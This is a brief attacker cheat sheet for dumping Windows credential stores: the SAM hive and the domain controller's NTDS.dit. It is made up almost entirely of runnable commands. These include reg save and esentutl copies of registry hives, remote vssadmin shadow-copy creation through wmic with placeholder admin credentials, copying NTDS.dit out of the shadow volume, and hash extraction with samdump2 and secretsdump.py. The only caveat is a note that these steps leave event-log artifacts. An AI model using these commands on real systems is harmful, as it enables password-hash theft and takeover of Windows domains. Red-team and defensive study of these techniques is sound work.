# SAM & NTDS.dit Dumping

## SAM via Registry
```cmd
reg save hklm\system system
reg save hklm\sam sam
```
```bash
# Extract hashes on Kali
samdump2 system sam
# Or with secretsdump
secretsdump.py -sam sam -system system LOCAL
```

## SAM via esentutl (LOLBin)
```cmd
esentutl.exe /y /vss C:\Windows\System32\config\SAM /d c:\temp\sam
esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d c:\temp\system
```

## NTDS.dit via vssadmin Shadow Copy
```cmd
# Create shadow copy (run on/against DC)
wmic /node:DC01 /user:admin@domain /password:pass process call create "cmd /c vssadmin create shadow /for=C: 2>&1"

# Copy NTDS.dit and hives from shadow
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY c:\temp\
```

## NTDS.dit Extraction
```bash
# Mount and extract
net use j: \\DC01\c$\temp /user:administrator pass
secretsdump.py -ntds ntds.dit -system system -security security LOCAL
```

## Notes
- SAM dump requires local admin; NTDS.dit requires DC admin
- vssadmin/wmic leave artifacts in event logs and service states
